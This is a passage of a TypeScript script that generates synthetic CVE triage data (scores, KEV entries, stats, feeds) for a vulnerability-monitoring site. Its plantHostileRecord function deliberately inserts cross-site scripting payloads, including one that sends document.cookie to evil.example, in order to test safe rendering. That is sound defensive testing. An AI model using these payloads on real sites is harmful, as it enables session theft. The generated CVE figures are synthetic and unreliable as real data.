        ? reason('prior.vendor', `Vendor in KEV (×${pr.count}): ${d.synth.vendor}`, 8, { url: kevUrl(d.synth.vendor) })
        : reason('prior.none', `Never in KEV: ${d.synth.vendor}`, -6),
  );

  // NOISE — only without exploitation and without a positive exploit signal
  const noise: Reason[] = [];
  if (!exploited && xPoints <= 0) {
    const cands: Reason[] = [];
    if (d.synth.noise === 'hobby') cands.push(reason('noise.hobby', `Tutorial project: ${d.synth.vendor}`, -20));
    if (d.synth.tags.includes('disputed')) cands.push(reason('noise.disputed', 'Disputed by the vendor or maintainer', -15));
    if (d.synth.noise === 'wordpress') cands.push(reason('noise.wordpress', `WordPress plugin (${d.cna})`, -10));
    if (d.synth.noise === 'kernel' && d.ssvc?.technical_impact !== 'total') cands.push(reason('noise.kernel', `Linux kernel bug-fix (${d.ssvc ? 'partial impact' : 'no SSVC'})`, -8));
    cands.sort((a, b) => a.points - b.points);
    cands.forEach((r, i) => i > 0 && (r.points = 0));
    noise.push(...cands);
  }
  const noisePoints = noise[0]?.points ?? 0;

  const raw = BASE_POINTS + xPoints + sevPoints + ssvcPoints + (prior[0]?.points ?? 0) + noisePoints;
  let value: number;
  if (exploited) {
    const floored = Math.min(100, Math.max(raw + EXPLOITED_BONUS, EXPLOITED_FLOOR));
    value = Math.min(100, Math.max(raw + EXPLOITED_BONUS, EXPLOITED_FLOOR) + (ransomware ? RANSOMWARE_BONUS : 0));
    // Points report what each chip actually added after the floor and the cap.
    e[0].points = floored - raw;
    if (ransomware) e.push(reason('kev.ransomware', 'Known ransomware campaign use', value - floored, { url: kevUrl(d.id) }));
  } else value = Math.max(0, Math.min(100, raw));

  const weaponized = ex.metasploit.length > 0 || ex.nuclei.length > 0;
  const info: Reason[] = [];
  if (d.aiCredit) info.push(reason('ai.credit', `AI-credited: “${d.aiCredit}”`, 0));
  if (d.batch) info.push(reason('batch', `Part of ${d.cna} · ${shortDate(Date.parse(d.batch.date))} (${fmtInt(d.batch.count)})`, 0, { at: d.batch.date }));
  if (d.kev) {
    const days = Math.round((Date.parse(d.kev.due_date) - Date.parse(ymd(NOW))) / DAY);
    info.push(reason('kev.due', `KEV due ${shortDate(Date.parse(d.kev.due_date))} · ${days === 0 ? 'today' : days > 0 ? `in ${days} day${days === 1 ? '' : 's'}` : `${-days} day${days === -1 ? '' : 's'} ago`}`, 0, { url: kevUrl(d.id), at: d.kev.due_date }));
    if (d.kev.forensic_triage) info.push(reason('kev.forensic', 'CISA requests forensic triage (BOD 26-04)', 0, { url: kevUrl(d.id) }));
  }
  if (cvss?.source === 'cisa-adp') info.push(reason('sev.adp', `No CNA score; CISA-ADP CVSS ${cvss.score.toFixed(1)} used`, 0));
  if (age < COLD_START_DAYS && d.epss) info.push(reason('epss.cold', `EPSS ${pct(d.epss.score)} (cold start, ${ageInt === 0 ? 'today' : `${ageInt}d old`})`, 0, { url: epssUrl, at: d.epss.date }));
  if (ex.poc.hype) info.push(reason('poc.hype', `${ex.poc.count} PoC repos in a week — attention, not weaponization`, 0, { url: ex.poc.top[0]?.url }));
  if (ex.poc.count > 0 && ex.poc.vetted === 0) info.push(reason('poc.unvetted', `${ex.poc.count} new unstarred PoC repo — not counted yet`, 0, { url: ex.poc.top[0]?.url }));
  if (d.synth.tags.includes('unsupported-when-assigned')) info.push(reason('tag.eol', 'Unsupported when assigned: replace or mitigate', 0, { url: cveUrl(d.id) }));

  const reasons = [...e, ...x, ...sev, ...ssvc, ...prior, ...noise, ...info];
  const unknowns: string[] = [];
  if (!cvss) unknowns.push('No CVSS score from the CNA or CISA-ADP');
  if (!d.ssvc) unknowns.push('No CISA SSVC assessment yet');
  if (age < COLD_START_DAYS && xPoints <= 0) unknowns.push(`Exploit feeds and EPSS lag new CVEs: ${ageInt} day${ageInt === 1 ? '' : 's'} old (trusted after ${COLD_START_DAYS})`);
  if (!d.epss) unknowns.push('Not scored by EPSS yet');
  if (!d.synth.product) unknowns.push('No affected product listed by the CNA');

  return { d, score: value, raw, exploited, weaponized, tier: tierFor(value, exploited, weaponized, KNOB_DEFAULT), reasons, unknowns };
}

/** Up to four chip ids for list rows: the exploitation chip, then positives, negatives, context. */
function topChips(reasons: readonly Reason[]): string[] {
  const e = reasons.filter((r) => r.family === 'E' && r.id !== 'kev.ransomware').slice(0, 1);
  const up = reasons.filter((r) => r.family !== 'E' && r.polarity === 'up' && r.points > 0).sort((a, b) => b.points - a.points);
  const down = reasons.filter((r) => r.polarity === 'down' && r.points < 0).sort((a, b) => a.points - b.points);
  const info = reasons.filter((r) => r.polarity === 'info');
  return [...e, ...up, ...down, ...info].slice(0, 4).map((r) => r.id);
}

// ───────────────────────────── outputs ─────────────────────────────

function toRow(s: Scored): Row {
  const d = s.d;
  const t = d.synth.title ?? (d.synth.description.length > 160 ? `${d.synth.description.slice(0, 159).trimEnd()}…` : d.synth.description);
  return {
    id: d.id,
    pub: iso(d.pub),
    cna: d.cna,
    v: d.synth.vendor,
    p: d.synth.product,
    t,
    s: s.score,
    tier: s.tier,
    x: s.exploited ? 1 : 0,
    w: s.weaponized ? 1 : 0,
    k: d.kev ? 1 : 0,
    ai: d.aiCredit ? 1 : 0,
    c: topChips(s.reasons),
    cv: d.synth.cvss?.score ?? null,
    e: d.epss?.score ?? null,
    kd: d.kev?.due_date ?? null,
    b: d.batch?.id ?? null,
  };
}

function timeline(s: Scored): CveDetail['timeline'] {
  const d = s.d;
  const ev: CveDetail['timeline'] = [
    { at: iso(d.reserved), event: 'CVE ID reserved', source: 'cvelist' },
    { at: iso(d.pub), event: `Published by ${d.cna}`, source: 'cvelist' },
  ];
  if (d.ssvc?.timestamp) ev.push({ at: d.ssvc.timestamp, event: `CISA SSVC assessment: exploitation ${d.ssvc.exploitation}`, source: 'cisa-adp' });
  if (d.exploits.poc.top[0]) ev.push({ at: d.exploits.poc.top.map((r) => r.created).sort()[0], event: 'First public PoC repo on GitHub', source: 'poc-github' });
  for (const e of d.exploits.exploitdb) if (e.date) ev.push({ at: e.date, event: `Exploit-DB ${e.id} published`, source: 'exploitdb' });
  if (d.kev) ev.push({ at: d.kev.date_added, event: 'Added to CISA KEV', source: 'kev' });
  if (d.epss) ev.push({ at: d.epss.date, event: `EPSS scored ${pct(d.epss.score)}`, source: 'epss' });
  return ev.sort((a, b) => Date.parse(a.at) - Date.parse(b.at));
}

function toDetail(s: Scored): CveDetail {
  const d = s.d;
  return {
    id: d.id,
    state: 'PUBLISHED',
    published: iso(d.pub),
    reserved: iso(d.reserved),
    updated: iso(Math.max(d.updated, d.pub)),
    cna: d.cna,
    title: d.synth.title,
    description: d.synth.description,
    cvss: d.synth.cvss,
    cwe: d.synth.cwe,
    affected: d.synth.product ? [{ vendor: d.synth.vendor, product: d.synth.product, purl: d.synth.purl }] : [],
    ssvc: d.ssvc,
    kev: d.kev,
    epss: d.epss,
    exploits: d.exploits,
    ai_credit: d.aiCredit,
    tags: d.synth.tags,
    batch: d.batch?.id ?? null,
    score: { value: s.score, tier: s.tier, raw: s.raw, model: SCORE_MODEL },
    reasons: s.reasons,
    unknowns: s.unknowns,
    timeline: timeline(s),
    references: d.synth.references,
  };
}

function assignBatches(drafts: Draft[]): void {
  const groups = new Map<string, Draft[]>();
  for (const d of drafts) {
    const key = `${d.cna}\u0000${ymd(d.pub)}`;
    let g = groups.get(key);
    if (!g) groups.set(key, (g = []));
    g.push(d);
  }
  for (const [key, members] of groups) {
    if (members.length < BATCH_MIN) continue;
    const [cna, date] = key.split('\u0000');
    const batch = { id: `${slugify(cna)}-${date}`, count: members.length, date };
    for (const d of members) d.batch = batch;
  }
}

function buildBatches(scored: readonly Scored[], rows: Map<string, Row>): Batch[] {
  const by = new Map<string, Scored[]>();
  for (const s of scored) {
    if (!s.d.batch) continue;
    let g = by.get(s.d.batch.id);
    if (!g) by.set(s.d.batch.id, (g = []));
    g.push(s);
  }
  const passed = (t: Tier) => t === 'exploited' || t === 'likely';
  return [...by.values()]
    .map((members): Batch => {
      const first = members[0].d;
      const fam = new Map<string, { name: string; count: number; passed: number }>();
      for (const m of members) {
        const name = m.d.synth.product || m.d.synth.vendor || 'Unspecified';
        const f = fam.get(name) ?? { name, count: 0, passed: 0 };
        f.count++;
        if (passed(m.tier)) f.passed++;
        fam.set(name, f);
      }
      const byTier = Object.fromEntries(TIERS.map((t) => [t, 0])) as Record<Tier, number>;
      for (const m of members) byTier[m.tier]++;
      const top = [...members].sort((a, b) => b.score - a.score || b.d.pub - a.d.pub).slice(0, 5);
      return {
        id: first.batch!.id,
        cna: first.cna,
        date: first.batch!.date,
        count: members.length,
        by_tier: byTier,
        families: [...fam.values()].sort((a, b) => b.count - a.count || b.passed - a.passed).slice(0, 8),
        top: top.map((m) => rows.get(m.d.id)!),
      };
    })
    .sort((a, b) => b.date.localeCompare(a.date) || b.count - a.count);
}

/** KEV CVEs published long before the window but added to the catalog recently. */
function olderKevDrafts(): Draft[] {
  const cna = (name: string) => PROFILES.find((p) => p.cna === name)!;
  const pool: readonly (readonly [Profile, number])[] = [
    [microsoft, 3], [cna('cisco'), 2], [cna('fortinet'), 2], [cna('ivanti'), 2], [cna('citrix'), 1], [oracle, 1], [cna('apache'), 2],
    [linux, 1], [cna('apple'), 1], [chrome, 1], [cna('SonicWall'), 1], [vulncheck, 2], [cna('Android'), 1],
  ];
  const out: Draft[] = [];
  for (let i = 0; i < 13; i++) {
    const profile = weighted(pool);
    const year = weighted<number>([[2025, 6], [2024, 4], [2023, 2], [2021, 2], [2019, 1], [2017, 1], [2014, 1]]);
    const pub = Date.UTC(year, int(0, 11), int(1, 28), int(0, 23), int(0, 59));
    const id = `CVE-${year}-${int(1_000, year >= 2024 ? 59_999 : 39_999)}`;
    if (usedIds.has(id)) continue;
    usedIds.add(id);
    const synth = profile.make(id, pub);
    synth.cvss = makeCvss(KINDS.rce, '3.1', synth.cvss?.source ?? 'cisa-adp', '', weighted<Band>([['crit', 0.6], ['high', 0.4]]));
    const d: Draft = {
      id, pub, reserved: pub - int(10, 200) * DAY, updated: NOW - int(1, 20) * DAY, cna: profile.cna, synth,
      ssvc: { exploitation: 'active', automatable: chance(0.5) ? 'yes' : 'no', technical_impact: chance(0.7) ? 'total' : 'partial', version: '2.0.3', timestamp: iso(NOW - int(2, 40) * DAY) },
      kev: null, epss: null, exploits: emptyExploits(), aiCredit: null, vendorItw: false, inWindow: false, profile, batch: null,
    };
    // Added 1–44 days ago: the newest are inside kev_adds_30d, the oldest only appear because they are still due.
    addKev(d, NOW - int(1, 44) * DAY - int(0, 20) * HOUR);
    if (chance(0.55)) addHighEpss(d);
    else d.epss = { score: round5(0.01 + rand() * 0.08), percentile: round5(0.9 + rand() * 0.07), date: ymd(NOW), model: 'v2026.06.15' };
    if (chance(0.4)) addMetasploit(d);
    if (chance(0.5)) addNuclei(d);
    if (chance(0.6)) addPoc(d, true);
    out.push(d);
  }
  return out;
}

function kevEntry(s: Scored): KevEntry {
  const k = s.d.kev!;
  return {
    id: s.d.id,
    vendor: s.d.synth.vendor || 'Unknown',
    product: s.d.synth.product || 'Multiple Products',
    name: k.name,
    date_added: k.date_added,
    due_date: k.due_date,
    ransomware: k.ransomware,
    forensic_triage: k.forensic_triage,
    description: s.d.synth.description.replace(/\s+/g, ' ').slice(0, 400),
    required_action: k.required_action,
    in_window: s.d.inWindow,
    score: s.score,
  };
}

// Yearly CVE volume by datePublished (approximate public totals; 2026 months are the real ones).
const YEARLY: Record<number, number> = {
  1999: 1_580, 2000: 1_240, 2001: 1_590, 2002: 2_400, 2003: 1_550, 2004: 2_710, 2005: 4_930, 2006: 6_610, 2007: 6_520, 2008: 5_630, 2009: 5_740, 2010: 4_650,
  2011: 4_160, 2012: 5_300, 2013: 5_190, 2014: 7_940, 2015: 6_500, 2016: 6_450, 2017: 14_710, 2018: 16_560, 2019: 17_340, 2020: 18_350, 2021: 20_160, 2022: 25_050,
  2023: 29_070, 2024: 40_010, 2025: 48_200,
};
const MONTHLY_2026 = [4_302, 4_616, 6_236, 5_813, 6_933, 7_949, 9_759, 12_259, 14_934, OCTOBER_TOTAL];
const AI_2026 = [14, 27, 31, 31, 23, 55, 63, 129, 160];
const KEV_2026 = [17, 28, 26, 31, 21, 23, 26, 31, 43];
const KEV_LAUNCH: Record<string, number> = { '2021-11': 291, '2021-12': 20, '2022-01': 40, '2022-02': 47, '2022-03': 274, '2022-04': 49, '2022-05': 74 };

function monthlyStats(octAi: number, octKev: number): StatsFile['monthly'] {
  const out: StatsFile['monthly'] = [];
  for (let y = 1999; y <= 2026; y++) {
    for (let m = 0; m < 12; m++) {
      if (y === 2026 && m > 9) break;
      const month = `${y}-${String(m + 1).padStart(2, '0')}`;
      let published: number;
      if (y === 2026) published = MONTHLY_2026[m];
      else if (y === 1999 && m < 8) published = 0;
      else {
        const months = y === 1999 ? 4 : 12;
        const trend = 0.84 + (0.32 * (y === 1999 ? m - 8 : m)) / (months - 1);
        published = Math.round((YEARLY[y] / months) * trend * (0.78 + rand() * 0.44));
      }
      const reserveFactor = y === 2026 && m === 9 ? 0.44 : y === 2026 && m === 8 ? 0.85 : 0.9 + rand() * 0.25;
      const ai = y === 2026 ? (m === 9 ? octAi : AI_2026[m]) : y === 2025 ? int(4, 19) : y === 2024 && m >= 6 ? int(0, 4) : 0;
      const kev = y === 2026 ? (m === 9 ? octKev : KEV_2026[m]) : (KEV_LAUNCH[month] ?? (y >= 2022 && (y > 2021 || m >= 10) ? int(8, 26) : 0));
      out.push({ month, published, reserved: Math.round(published * reserveFactor), rejected: Math.round(published * (0.01 + rand() * 0.03)), ai, kev_added: kev });
    }
  }
  return out;
}

function buildStats(window: readonly Scored[], octAi: number, octKev: number): StatsFile {
  const passed = (t: Tier) => t === 'exploited' || t === 'likely';
  const daily = DAYS.map((day) => {
    const inDay = window.filter((s) => s.d.pub >= day.start && s.d.pub < day.end);
    return { date: day.date, published: inDay.length, passed: inDay.filter((s) => passed(s.tier)).length, exploited: inDay.filter((s) => s.exploited).length };
  });
  const start = Math.floor(WINDOW_START / HOUR) * HOUR;
  const hours = Math.floor((NOW - start) / HOUR) + 1;
  const counts: [number, number, number, number][] = Array.from({ length: hours }, () => [0, 0, 0, 0]);
  for (const s of window) counts[Math.floor((s.d.pub - start) / HOUR)][TIERS.indexOf(s.tier)]++;
  const cnaMap = new Map<string, { cna: string; count: number; passed: number; no_cvss: number; ssvc_missing: number }>();
  for (const s of window) {
    const c = cnaMap.get(s.d.cna) ?? { cna: s.d.cna, count: 0, passed: 0, no_cvss: 0, ssvc_missing: 0 };
    c.count++;
    if (passed(s.tier)) c.passed++;
    if (!s.d.synth.cvss) c.no_cvss++;
    if (!s.d.ssvc) c.ssvc_missing++;
    cnaMap.set(s.d.cna, c);
  }
  const ai = new Map<string, number>();
  for (const s of window) if (s.d.aiCredit) ai.set(s.d.aiCredit, (ai.get(s.d.aiCredit) ?? 0) + 1);
  return {
    schema_version: SCHEMA_VERSION,
    generated_at: GENERATED_AT,
    monthly: monthlyStats(octAi, octKev),
    daily,
    hourly: { start: new Date(start).toISOString(), hours, counts },
    cnas: [...cnaMap.values()].sort((a, b) => b.count - a.count).slice(0, 25),
    ai_credits: [...ai.entries()].map(([text, count]) => ({ text, count })).sort((a, b) => b.count - a.count).slice(0, 20),
  };
}

const TIER_RANK: Record<Tier, number> = { quiet: 0, watch: 1, likely: 2, exploited: 3 };
function buildChanges(window: readonly Scored[]): Change[] {
  const since = NOW - 7 * DAY;
  const runAt = (t: number) => new Date(Math.min(NOW, Math.ceil((t - 30 * 60_000) / HOUR) * HOUR + 30 * 60_000)).toISOString();
  const out: Change[] = [];
  for (const s of window) {
    if (s.tier === 'quiet') continue;
    const signal = s.reasons.filter((r) => (r.family === 'E' || r.family === 'X') && r.polarity === 'up').map((r) => r.id);
    if (s.d.pub >= since && TIER_RANK[s.tier] >= 2) {
      out.push({ id: s.d.id, at: runAt(s.d.pub + 20 * 60_000), from: null, to: s.tier, added: s.reasons.filter((r) => r.points !== 0).slice(0, 4).map((r) => r.id) });
      continue;
    }
    const kevAt = s.d.kev ? Date.parse(s.d.kev.date_added) + 15 * HOUR : 0;
    if (kevAt >= since) out.push({ id: s.d.id, at: runAt(kevAt), from: pick<Tier>(['likely', 'watch', 'watch', 'quiet']), to: 'exploited', added: ['kev.listed'] });
    else if (TIER_RANK[s.tier] >= 1 && signal.length > 0 && chance(s.tier === 'likely' ? 0.5 : 0.2)) {
      // The newest artifact arrived during the last week: the tier before it is the score without it.
      const chip = s.reasons.find((r) => r.id === signal[0])!;
      const before = tierFor(s.score - chip.points, false, false, KNOB_DEFAULT);
      const at = Math.max(since + int(1, 160) * HOUR, s.d.pub + DAY);
      if (at < NOW && TIER_RANK[before] < TIER_RANK[s.tier]) out.push({ id: s.d.id, at: runAt(at), from: before, to: s.tier, added: [chip.id] });
    }
  }
  return out.sort((a, b) => b.at.localeCompare(a.at) || a.id.localeCompare(b.id)).slice(0, 500);
}

function sources(cvelistRecords: number): SourceStatus[] {
  const fetched = (minAgo: number) => new Date(NOW - (minAgo + 1) * 60_000).toISOString();
  return [
    { id: 'cvelist', name: 'CVE List V5', url: 'https://github.com/CVEProject/cvelistV5', ok: true, stale: false, fetched_at: fetched(0), upstream_version: hex(40), records: cvelistRecords, error: null, license: 'CVE Terms of Use (https://www.cve.org/Legal/TermsOfUse), © The MITRE Corporation' },
    { id: 'cisa-adp', name: 'CISA ADP (Vulnrichment)', url: 'https://github.com/cisagov/vulnrichment', ok: true, stale: false, fetched_at: fetched(0), upstream_version: hex(40), records: 207_689, error: null, license: 'CC0-1.0 (no CISA/DHS endorsement implied)' },
    { id: 'kev', name: 'CISA Known Exploited Vulnerabilities', url: 'https://raw.githubusercontent.com/cisagov/kev-data/main/known_exploited_vulnerabilities.json', ok: true, stale: false, fetched_at: fetched(2), upstream_version: '2026.10.24', records: 1_758, error: null, license: 'CC0-1.0 (no CISA/DHS endorsement implied)' },
    { id: 'epss', name: 'EPSS (FIRST)', url: 'https://epss.empiricalsecurity.com/epss_scores-current.csv.gz', ok: true, stale: true, fetched_at: fetched(23 * 60), upstream_version: 'v2026.06.15 2026-10-25', records: 395_101, error: 'epss.empiricalsecurity.com: HTTP 403; GitHub mirror has no file for 2026-10-26 yet; using the cached copy', license: 'FIRST EPSS usage agreement: free use, attribution requested (https://www.first.org/epss)' },
    { id: 'metasploit', name: 'Metasploit Framework', url: 'https://raw.githubusercontent.com/rapid7/metasploit-framework/master/db/modules_metadata_base.json', ok: true, stale: false, fetched_at: fetched(3), upstream_version: '2026-10-23T17:24:13.000Z', records: 7_218, error: null, license: 'BSD-3-Clause' },
    { id: 'nuclei', name: 'Nuclei templates', url: 'https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/cves.json', ok: true, stale: false, fetched_at: fetched(3), upstream_version: null, records: 4_530, error: null, license: 'MIT' },
    { id: 'exploitdb', name: 'Exploit-DB', url: 'https://gitlab.com/exploit-database/exploitdb/-/raw/main/files_exploits.csv', ok: true, stale: true, fetched_at: fetched(5 * 60 + 12), upstream_version: '2026-10-22', records: 47_181, error: 'gitlab.com: HTTP 429 (rate limited); reusing the cached copy', license: 'GPL-2.0 (only IDs, flags and links are republished)' },
    { id: 'poc-github', name: 'PoC-in-GitHub', url: 'https://github.com/nomi-sec/PoC-in-GitHub', ok: true, stale: false, fetched_at: fetched(1), upstream_version: hex(40), records: 11_417, error: null, license: 'CC0-1.0 (listed repositories are third-party, unverified code)' },
  ];
}

// ───────────────────────────── feeds ─────────────────────────────

const xml = (s: string) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&apos;');
const siteUrl = `https://${BRAND.repo.split('/')[0]}.github.io/${BRAND.repo.split('/')[1]}`;

function atom(id: string, title: string, entries: { id: string; title: string; updated: string; link: string; summary: string }[]): string {
  const body = entries
    .map((e) => `<entry><title>${xml(e.title)}</title><id>${xml(e.id)}</id><updated>${e.updated}</updated><link href="${xml(e.link)}"/><summary>${xml(e.summary)}</summary></entry>`)
    .join('');
  return `<?xml version="1.0" encoding="utf-8"?>\n<feed xmlns="http://www.w3.org/2005/Atom"><title>${xml(title)}</title><id>${xml(id)}</id><updated>${GENERATED_AT}</updated><link href="${xml(siteUrl)}"/><author><name>${xml(BRAND.name)}</name><uri>${xml(REPO_URL)}</uri></author>${body}</feed>\n`;
}

function icsFold(line: string): string[] {
  const out: string[] = [];
  let cur = '';
  for (const ch of line) {
    if (Buffer.byteLength(cur + ch, 'utf8') > (out.length === 0 ? 75 : 74)) {
      out.push(out.length === 0 ? cur : ` ${cur}`);
      cur = '';
    }
    cur += ch;
  }
  out.push(out.length === 0 ? cur : ` ${cur}`);
  return out;
}
const icsText = (s: string) => s.replace(/\\/g, '\\\\').replace(/;/g, '\\;').replace(/,/g, '\\,').replace(/\r?\n/g, '\\n');

function ics(entries: readonly KevEntry[]): string {
  const stamp = GENERATED_AT.replace(/[-:]/g, '').replace(/\.\d{3}/, '');
  const lines = ['BEGIN:VCALENDAR', 'VERSION:2.0', `PRODID:-//${BRAND.name}//KEV due dates//EN`, 'CALSCALE:GREGORIAN', `X-WR-CALNAME:${icsText(`${BRAND.name} · CISA KEV due dates`)}`];
  const from = ymd(NOW - 7 * DAY);
  const to = ymd(NOW + 60 * DAY);
  for (const e of entries.filter((x) => x.due_date >= from && x.due_date <= to)) {
    const day = e.due_date.replace(/-/g, '');
    const next = ymd(Date.parse(e.due_date) + DAY).replace(/-/g, '');
    lines.push('BEGIN:VEVENT', `UID:${e.id.toLowerCase()}-kev-due@${BRAND.slug}`, `DTSTAMP:${stamp}`, `DTSTART;VALUE=DATE:${day}`, `DTEND;VALUE=DATE:${next}`, `SUMMARY:${icsText(`KEV due: ${e.id} · ${e.vendor} ${e.product}`)}`, `DESCRIPTION:${icsText(`${e.name}. ${e.required_action}`)}`, `URL:${cveUrl(e.id)}`, 'END:VEVENT');
  }
  lines.push('END:VCALENDAR');
  return lines.flatMap(icsFold).join('\r\n') + '\r\n';
}

// ───────────────────────────── main ─────────────────────────────

/** A record with hostile text, so the site's text-only rendering is exercised. */
function plantHostileRecord(drafts: Draft[]): void {
  const d = drafts.find((x) => x.cna === 'VulDB' && x.synth.noise === 'hobby' && x.pub > NOW - 3 * DAY);
  if (!d) return;
  d.synth.title = `${d.synth.vendor} ${d.synth.product} 1.0 search.php "><script>alert(document.domain)</script> cross site scripting`;
  d.synth.description = `A vulnerability was found in ${d.synth.vendor} ${d.synth.product} 1.0. The manipulation of the argument q with the input "><img src=x onerror=alert(1)> leads to cross site scripting. Payload: <svg/onload=fetch('//evil.example/'+document.cookie)>`;
  d.synth.references = ['javascript:alert(document.cookie)', 'https://vuldb.com/?id.333333', 'data:text/html,<script>alert(1)</script>'];
}

function writeJson(root: string, rel: string, value: unknown): void {
  const file = join(root, rel);
  mkdirSync(dirname(file), { recursive: true });
  writeFileSync(file, JSON.stringify(value));
}

function main(): void {
  const out = resolve(process.argv[2] ?? 'site/public/data');
  const tmp = `${out}.tmp-${process.pid}`;
  rmSync(tmp, { recursive: true, force: true });

  const drafts = generateWindow();
  assignBatches(drafts);
  assignEvidence(drafts);
  plantHostileRecord(drafts);
  const window = drafts.map(score);
  const older = olderKevDrafts().map(score);
  const rowsById = new Map(window.map((s) => [s.d.id, toRow(s)]));
  const byPubDesc = [...window].sort((a, b) => b.d.pub - a.d.pub || a.d.id.localeCompare(b.d.id));
  const indexRows = byPubDesc.map((s) => rowsById.get(s.d.id)!);
  const signalRows = indexRows.filter((r) => r.s >= SIGNAL_MIN_SCORE || r.x || r.w).sort((a, b) => b.s - a.s || b.pub.localeCompare(a.pub));
  const table = (rows: readonly Row[], scope: string) => ({ schema_version: SCHEMA_VERSION, generated_at: GENERATED_AT, scope, cols: ROW_COLS, rows: rows.map((r) => ROW_COLS.map((c) => r[c])) });

  // KEV: entries added in the last 30 days, or due from 14 days ago onward; newest first.
  const kevFrom = ymd(NOW - 30 * DAY);
  const dueFrom = ymd(NOW - 14 * DAY);
  const kevEntries = [...window, ...older]
    .filter((s) => s.d.kev && (s.d.kev.date_added >= kevFrom || s.d.kev.due_date >= dueFrom))
    .map(kevEntry)
    .sort((a, b) => b.date_added.localeCompare(a.date_added) || a.id.localeCompare(b.id));
  const kevAdds30d = kevEntries.filter((e) => e.date_added >= kevFrom).length;
  const kevAddsMtd = kevEntries.filter((e) => e.date_added >= '2026-10-01').length;

  const batches = buildBatches(window, rowsById);
  const octAi = window.filter((s) => s.d.aiCredit && s.d.pub >= Date.UTC(2026, 9, 1)).length;
  const stats = buildStats(window, octAi, kevAddsMtd);
  const changes = buildChanges(window);

  const byTier = Object.fromEntries(TIERS.map((t) => [t, 0])) as Record<Tier, number>;
  for (const r of indexRows) byTier[r.tier]++;
  const isPassed = (r: Row) => r.tier === 'exploited' || r.tier === 'likely';
  const since = (ms: number) => indexRows.filter((r) => Date.parse(r.pub) >= NOW - ms);
  const ytd = stats.monthly.filter((m) => m.month.startsWith('2026-')).reduce((a, m) => a + m.published, 0);
  const meta: Meta = {
    schema_version: SCHEMA_VERSION,
    generated_at: GENERATED_AT,
    score_model: SCORE_MODEL,
    knob_default: KNOB_DEFAULT,
    window: { from: new Date(WINDOW_START).toISOString(), to: GENERATED_AT, days: WINDOW_DAYS },
    counts: {
      window_published: indexRows.length,
      window_passed: byTier.exploited + byTier.likely,
      window_by_tier: byTier,
      published_24h: since(DAY).length,
      passed_24h: since(DAY).filter(isPassed).length,
      published_7d: since(7 * DAY).length,
      passed_7d: since(7 * DAY).filter(isPassed).length,
      published_mtd: OCTOBER_TOTAL,
      published_ytd: ytd,
      rejected_window: 219,
      kev_total: 1_758,
      kev_adds_30d: kevAdds30d,
      kev_adds_mtd: kevAddsMtd,
      ai_credited_window: indexRows.filter((r) => r.ai).length,
      batches_window: batches.length,
    },
    definitions: {
      window_published: `CVE records in PUBLISHED state whose datePublished is within the last ${WINDOW_DAYS} days.`,
      window_passed: `Of those, the ones in the Exploited or Likely-next tier at the default knob (${KNOB_DEFAULT}).`,
      window_by_tier: `Window CVEs per tier at the default knob (${KNOB_DEFAULT}).`,
      published_24h: 'CVEs published in the last 24 hours.',
      passed_24h: 'Of those, Exploited or Likely next at the default knob.',
      published_7d: 'CVEs published in the last 7 days.',
      passed_7d: 'Of those, Exploited or Likely next at the default knob.',
      published_mtd: 'CVEs published since the start of the current calendar month (UTC).',
      published_ytd: 'CVEs published since January 1 of the current year (UTC).',
      rejected_window: `REJECTED records dated within the last ${WINDOW_DAYS} days (not shown anywhere else).`,
      kev_total: 'Entries in the CISA Known Exploited Vulnerabilities catalog.',
      kev_adds_30d: 'KEV entries added in the last 30 days (by dateAdded).',
      kev_adds_mtd: 'KEV entries added since the start of the current calendar month (UTC).',
      ai_credited_window: 'Window CVEs whose CNA credits name an AI system or AI lab (information only).',
      batches_window: `Patch-day batches in the window: ${BATCH_MIN}+ CVEs from one CNA on one UTC day.`,
    },
    sources: sources(414_960),
  };

  writeJson(tmp, 'v1/meta.json', meta);
  writeJson(tmp, 'v1/index.json', table(indexRows, `all CVEs published in the last ${WINDOW_DAYS} days`));
  writeJson(tmp, 'v1/signal.json', table(signalRows, `score >= ${SIGNAL_MIN_SCORE} or exploited/weaponized; published in the last ${WINDOW_DAYS} days`));
  writeJson(tmp, 'v1/batches.json', { schema_version: SCHEMA_VERSION, generated_at: GENERATED_AT, min_size: BATCH_MIN, batches });
  writeJson(tmp, 'v1/kev.json', { schema_version: SCHEMA_VERSION, generated_at: GENERATED_AT, catalog_version: '2026.10.24', entries: kevEntries });
  writeJson(tmp, 'v1/stats.json', stats);
  writeJson(tmp, 'v1/changes.json', { schema_version: SCHEMA_VERSION, generated_at: GENERATED_AT, items: changes });

  const shards = Array.from({ length: SHARD_COUNT }, () => ({}) as Record<string, CveDetail>);
  for (const s of [...window, ...older]) shards[parseInt(shardOf(s.d.id), 16)][s.d.id] = toDetail(s);
  shards.forEach((items, i) => writeJson(tmp, `v1/cve/${i.toString(16).padStart(2, '0')}.json`, { schema_version: SCHEMA_VERSION, generated_at: GENERATED_AT, items }));

  const passedRows = indexRows.filter(isPassed).slice(0, 100);
  const feeds = join(tmp, 'feeds');
  mkdirSync(feeds, { recursive: true });
  writeFileSync(
    join(feeds, 'signal.xml'),
    atom(`urn:${BRAND.slug}:signal`, `${BRAND.name} · Exploited and likely-next CVEs`, passedRows.map((r) => ({
      id: `urn:${BRAND.slug}:cve:${r.id}`,
      title: `${r.id} · ${[r.v, r.p].filter(Boolean).join(' ') || r.cna} · ${r.tier}`,
      updated: r.pub,
      link: `${siteUrl}/cve/${r.id}`,
      summary: r.c.map((c) => CHIP_BY_ID[c]?.short ?? c).join(' · '),
    }))),
  );
  writeFileSync(
    join(feeds, 'kev.xml'),
    atom(`urn:${BRAND.slug}:kev`, `${BRAND.name} · CISA KEV additions`, kevEntries.filter((e) => e.date_added >= kevFrom).map((e) => ({
      id: `urn:${BRAND.slug}:kev:${e.id}`,
      title: `${e.id} · ${e.vendor} ${e.product} · due ${e.due_date}`,
      updated: `${e.date_added}T00:00:00Z`,
      link: `${siteUrl}/cve/${e.id}`,
      summary: e.name,
    }))),
  );
  writeFileSync(join(feeds, 'kev-due.ics'), ics(kevEntries));

  for (const sub of ['v1', 'feeds']) {
    rmSync(join(out, sub), { recursive: true, force: true });
    mkdirSync(out, { recursive: true });
    renameSync(join(tmp, sub), join(out, sub));
  }
  rmSync(tmp, { recursive: true, force: true });

  const gz = (rel: string) => `${(gzipSync(readFileSync(join(out, rel))).length / 1024).toFixed(0)} KB gz`;
